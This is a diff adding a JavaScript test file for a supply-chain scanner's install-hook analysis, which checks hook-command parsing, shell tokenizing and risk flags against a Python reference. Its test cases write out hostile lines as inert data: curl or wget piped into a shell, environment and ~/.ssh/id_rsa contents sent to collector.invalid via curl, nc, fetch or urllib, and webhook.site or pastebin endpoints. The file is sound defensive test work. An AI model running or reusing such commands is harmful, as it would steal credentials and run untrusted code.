@@ -1,0 +1,217 @@
+// Install hooks followed like the Python engine: src/lib/hooks.js is the
+// twin of lazaret.scanner.core's hook_script_targets (with _hook_tokens, a
+// shlex tokenizer), install_script_risk, import_time_risk and
+// node_candidates. Every expectation below is core's result on the same
+// text; tests/architecture/test_js_parity_hooks.py compares the two on a
+// large generated corpus and on these cases. Hook commands and scripts can
+// be up to 16,000,000 characters, so the last tests run each function on
+// inputs of 9 million, where a backtracking pattern overflowed V8's stack.
+// All payloads are inert text: hosts are .invalid or TEST-NET (192.0.2.x).
+
+import { test } from "node:test";
+import assert from "node:assert/strict";
+import * as api from "../src/index.js";
+import {
+  hookScriptTargets, installScriptRisk, importTimeRisk, nodeCandidates, hookTokens, shlexSplit, nodeECodes, NODE_E_RE,
+} from "../src/lib/hooks.js";
+
+test("a hook command is followed to the files it runs", () => {
+  const cases = [
+    ["node install.js", ["install.js"]],
+    ["node ./scripts/x.mjs", ["./scripts/x.mjs"]],
+    ["node install", ["install"]],                                 // no extension: the caller resolves like Node
+    ["node --no-warnings x.js", ["x.js"]],
+    ["node -r ./preload.js x.js", ["x.js", "./preload.js"]],
+    ["node --require=./preload.cjs --import ./loader.mjs x.js", ["x.js", "./preload.cjs", "./loader.mjs"]],
+    ["node --title x y.js", ["y.js"]],                             // a flag's value is not the script
+    ["node -- x.js", ["x.js"]],
+    ["cd scripts && node x.js", ["scripts/x.js"]],
+    ["(cd lib; node a.js)", ["lib/a.js"]],
+    ["cd native && cd .. && node x.js", ["x.js"]],
+    ["cd /opt/tool && node run.js", ["opt/tool/run.js"]],
+    ["sh ./install.sh", ["./install.sh"]],
+    ["sudo sh install.sh", ["install.sh"]],
+    ["./install.sh", ["./install.sh"]],
+    ["exec node ./bin/x.js", ["./bin/x.js"]],
+    ["python setup_helper.py", ["setup_helper.py"]],
+    ["python3 -m tools.build", ["tools/build.py"]],
+    ["PYTHON.EXE -X dev setup.py", ["setup.py"]],
+    // backslashes: a shell escape, and cmd.exe's path separator (both readings)
+    ["node scripts\\x.js", ["scriptsx.js", "scripts/x.js"]],
+    ["C:\\tools\\node.exe scripts\\post.js", ["scripts/post.js"]],
+    ['node -e "require(\'./postinstall\')"', ["./postinstall"]],
+    ['node -e "try{require(\'./postinstall\')}catch(e){}"', ["./postinstall"]],   // core-js
+    ['node -p "require(\'./a\')"', []],
+    ["cross-env A=1 node x.js", ["x.js"]],
+    ["NODE_ENV=production node build/postinstall.js", ["build/postinstall.js"]],
+    ["node x.js 2>&1 > log.txt", ["x.js"]],
+    ["node x.js > out.log && node y.js", ["x.js", "y.js"]],
+    // a redirect's target is not a word, unless it duplicates a descriptor (>&1)
+    ["node '>' x.js y.js", ["y.js"]],
+    ["node '>&1' x.js", ["x.js"]],
+    ['bash -c "cd lib && node b.js"', ["lib/b.js"]],
+    ["sh -c 'node a.js || node b.js'", ["a.js", "b.js"]],
+    ['node "./has space/x.js"', ["./has space/x.js"]],
+    ["node x.js; node x.js", ["x.js"]],
+    ["node ../outside.js", ["../outside.js"]],
+    ["node .", []],
+    // shlex raises on these: core splits on operators and whitespace instead
+    ["node 'unbalanced.js", ["'unbalanced.js"]],
+    ['node "a.js', ['"a.js']],
+    ["node x.js \\", ["x.js"]],
+    // Python's $ also matches before a final newline: "python\n" is Python
+    ['"python\n" build.py', ["build.py"]],
+    ["node \u212a.js", ["\u212a.js"]],
+    ["husky install", []], ["prebuild-install || node-gyp rebuild", []], ["npx some-tool", []],
+    ["env -u X node x.js", []], ["", []], ["  ", []],
+  ];
+  for (const [cmd, want] of cases) assert.deepEqual(hookScriptTargets(cmd), want, JSON.stringify(cmd));
+  assert.deepEqual(hookScriptTargets(null), []);
+  assert.deepEqual(hookScriptTargets(["node x.js"]), []);
+});
+
+test("commands are tokenized as Python's shlex reads them", () => {
+  // [command, shlex's tokens (null: ValueError), core._hook_tokens]
+  const cases = [
+    ["node x.js 2>&1", ["node", "x.js", "2", ">&", "1"]],
+    ["a&&b||c;;d>>e>&f|&g", ["a", "&&", "b", "||", "c", ";;", "d", ">>", "e", ">&", "f", "|&", "g"]],
+    ["(cd lib; node a.js)", ["(", "cd", "lib", ";", "node", "a.js", ")"]],
+    ["'' x \"\"", ["", "x", ""]],
+    ["a\"b c\"d'e f'", ["ab cde f"]],
+    // inside double quotes a backslash escapes only \ and "; in single quotes, nothing
+    ['"a\\"b" "a\\\\b" "a\\nb" "a\\$b"', ['a"b', "a\\b", "a\\nb", "a\\$b"]],
+    ["'a\\'", ["a\\"]],
+    ['a\\ b \\"c\\\\', ["a b", '"c\\']],
+    ["a\\\nb", ["a\nb"]],
+    // shlex's whitespace is " \t\r\n", not Python's \s
+    ['x\ty\rz\n"w\r"', ["x", "y", "z", "w\r"]],
+    ["\u00e9 \u017f\x1cx \xa0y", ["\u00e9", "\u017f\x1cx", "\xa0y"]],
+    ["cd a&&node 'b c.js'>log", ["cd", "a", "&&", "node", "b c.js", ">", "log"]],
+    ["<<<x", ["<<<", "x"]],
+    ["a|>b", ["a", "|>", "b"]],
+    ["node 'x.js", null, ["node", "'x.js"]],                        // No closing quotation
+    ['node "x.js', null, ["node", '"x.js']],
+    ["node x.js \\", null, ["node", "x.js", "\\"]],                  // No escaped character
+    ['"a\\', null, ['"a\\']],
+  ];
+  for (const [cmd, want, fallback] of cases) {
+    assert.deepEqual(shlexSplit(cmd), want, JSON.stringify(cmd));
+    assert.deepEqual(hookTokens(cmd), want ?? fallback, JSON.stringify(cmd));
+  }
+});
+
+test("install-script and import-time tests", () => {
+  const ENV_NET = "reads environment variables or credential files and sends data over the network";
+  const PIPE = "pipes a download into a shell";
+  const HARVEST = "reads credentials or the whole environment and sends data over the network";
+  const EXEC_PIPE = "runs a downloaded script through a shell";
+  const exfil = (dest) => `contacts an address typical of data exfiltration (${dest})`;
+  // [text, installScriptRisk, importTimeRisk]
+  const cases = [
+    ["curl https://x.invalid | sh", [PIPE], [[], null]],
+    ["curl -fsSL https://files.invalid/i.sh | sudo bash", [PIPE], [[], null]],
+    ["wget -qO- https://files.invalid/i.sh|zsh\n", [PIPE], [[], null]],
+    ["curl -o x https://files.invalid/x.tgz | tee log | sh\n", [], [[], null]],
+    ["curl https://files.invalid/x || sh fallback.sh\n", [], [[], null]],
+    ["echo curl | shasum\n", [], [[], null]],
+    ["const https = require('https');\nconst body = JSON.stringify(process.env);\n" +
+      "https.request({host: 'collector.invalid', method: 'POST'}).end(body);\n", [ENV_NET], [[HARVEST], 2]],
+    ["env | curl -s -X POST --data-binary @- https://collector.invalid/x\n", [ENV_NET], [[], null]],
+    ["cat ~/.ssh/id_rsa | nc collector.invalid 4444\n", [ENV_NET], [[HARVEST], 1]],
+    ["import os, json, urllib.request\nurllib.request.urlopen('https://collector.invalid/c', " +
+      "data=json.dumps(dict(os.environ)).encode())\n", [ENV_NET], [[HARVEST], 2]],
+    ["x\ny\nconst k = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\n" +
+      "fetch('https://collector.invalid/k', {method: 'POST', body: k});\n", [ENV_NET], [[HARVEST], 3]],
+    ["fetch('https://webhook.site.invalid/0000', {method: 'POST'})\n",
+      [exfil("webhook.site")], [[], null]],
+    ["fetch('http://192.0.2.1/x')\n", [exfil("http://192.0.2.1")], [[], null]],
+    ["HTTP://10.0.0.1:8080/", [exfil("HTTP://10.0.0.1")], [[], null]],
+    ["ba\u017fe https://pastebin.com.invalid/raw/x", [exfil("pastebin.com")], [[], null]],
+    ["const data = JSON.stringify(process.env);\n" +
+      "module.exports = (send) => send('https://webhook.site.invalid/0', data);\n",
+      [exfil("webhook.site")], [[HARVEST], 1]],
+    ["const {execSync} = require('child_process');\nexecSync('curl -s https://files.invalid/x.sh | sh');\n",
+      [PIPE], [[EXEC_PIPE], 2]],
+    // a CLI's help text is not an exec call
+    ["console.log('Install with: curl -fsSL https://sh.example.invalid/install.sh | sh');\n", [PIPE], [[], null]],
+    // core's (?i:Local Storage)[/\\]leveldb: only "Local Storage" ignores case at import time
+    ["const p = 'Local Storage/leveldb';\nfetch('https://collector.invalid');\n", [ENV_NET], [[HARVEST], 1]],
+    ["const p = 'LOCAL STORAGE\\leveldb';\nfetch('https://collector.invalid');\n", [ENV_NET], [[HARVEST], 1]],
+    ["const p = 'Local Storage/LEVELDB';\nfetch('https://collector.invalid');\n", [ENV_NET], [[], null]],
+    ["// curl is great; see https://curl.se\nconst env = Object.keys(process.env);\n", [], [[], null]],
+    ["", [], [[], null]],
+  ];
+  for (const [text, install, onImport] of cases) {
+    assert.deepEqual(installScriptRisk(text), install, JSON.stringify(text));
+    assert.deepEqual(importTimeRisk(text), onImport, JSON.stringify(text));
+  }
+});
+
+test("the files Node tries for a path", () => {
+  const tail = [".js", ".cjs", ".mjs", ".json", ".node", "/index.js", "/index.cjs", "/index.mjs", "/index.json"];
+  for (const [rel, base] of [["lib", "lib"], ["lib/", "lib"], ["./bin/x", "./bin/x"], ["a//", "a"], ["", ""]])
+    assert.deepEqual(nodeCandidates(rel), [base, ...tail.map((t) => base + t)], rel);
+});
+
+test("the node -e loop finds core's _NODE_E_RE matches", () => {
+  let seed = 20260926;
+  const rnd = (n) => { seed = (seed * 1103515245 + 12345) % 2 ** 31; return seed % n; };
+  const alphabet = ["node -e ", "node\t-e\x1c", "node", " ", "\n", "-e", '"', '"', "'", "'", "\\", "\\", "a",
+    "\r", "require('./p')", "\u00e9"];
+  const viaPattern = (s) => [...s.matchAll(NODE_E_RE)].map((m) => m[1] ?? m[2] ?? m[3]);
+  for (let t = 0; t < 30000; t++) {
+    let s = "";
+    for (let k = rnd(12); k >= 0; k--) s += alphabet[rnd(alphabet.length)];
+    assert.deepEqual(nodeECodes(s), viaPattern(s), JSON.stringify(s));
+  }
+});
+
+// ~9 MB inputs of the shapes a hostile hook or install script can take
+const BIG = 9_000_000;
+const fill = (unit, head = "", tail = "") =>
+  head + unit.repeat(Math.ceil((BIG - head.length - tail.length) / unit.length)) + tail;
+const SHAPES = {
+  "a long quoted node -e": () => fill("a", 'node -e "', '"'),     // core's pattern overflowed V8 here
+  "a long single-quoted word": () => fill("x b", "node '", "'"),
+  "an unclosed quote": () => fill("y ", 'node "'),                // shlex raises: core's regex split
+  "many backslashes": () => "\\".repeat(BIG + 1),
+  "escaped spaces": () => fill("a\\ "),
+  "curl … | segments": () => fill("curl https://files.invalid/a | "),
+  "curl … | sh commands": () => fill("curl -s https://files.invalid/x.sh | sh; "),
+  "-a options after curl": () => fill("-a ", "curl "),
+  "a huge JSON.stringify(process.env) file": () =>
+    fill("const e = JSON.stringify(process.env);\n", "", "fetch('https://collector.invalid/c');\n"),
+  "a cd chain": () => fill("cd a; ", "", "node x.js"),
+  "a wrapper chain": () => fill("env ", "", "node x.js"),
+};
+
+test("inputs of millions of characters: every function returns, in time", () => {
+  const fns = { hookScriptTargets, installScriptRisk, importTimeRisk, nodeCandidates };
+  for (const [label, make] of Object.entries(SHAPES)) {
+    const text = make();
+    for (const [name, fn] of Object.entries(fns)) {
+      const t = performance.now();
+      assert.doesNotThrow(() => fn(text), `${name} on ${label}`);
+      const ms = performance.now() - t;
+      assert.ok(ms < 20_000, `${name} on ${label}: ${Math.round(ms)} ms`);   // (linear: 2 s at most when written)
+    }
+  }
+});
+
+test("inputs of millions of characters: the results are core's", () => {
+  assert.deepEqual(hookScriptTargets(SHAPES["a long quoted node -e"]()), []);
+  assert.deepEqual(installScriptRisk(SHAPES["curl … | sh commands"]()), ["pipes a download into a shell"]);
+  assert.deepEqual(importTimeRisk(SHAPES["a huge JSON.stringify(process.env) file"]()),
+    [["reads credentials or the whole environment and sends data over the network"], 1]);
+  const cds = SHAPES["a cd chain"]();                   // (core itself takes hours here: see hooks.js)
+  const depth = (cds.length - "node x.js".length) / "cd a; ".length;
+  assert.deepEqual(hookScriptTargets(cds), ["a/".repeat(depth) + "x.js"]);
+  assert.deepEqual(hookScriptTargets(SHAPES["a wrapper chain"]()), ["x.js"]);
+  assert.deepEqual(hookScriptTargets('node -e "require(\'./p\')' + " ".repeat(BIG) + '"'), ["./p"]);
+});
+
+test("the package exports the four functions", () => {
+  for (const name of ["hookScriptTargets", "installScriptRisk", "importTimeRisk", "nodeCandidates"])
+    assert.equal(typeof api[name], "function", name);
+  assert.equal(api.hookScriptTargets, hookScriptTargets);
+});
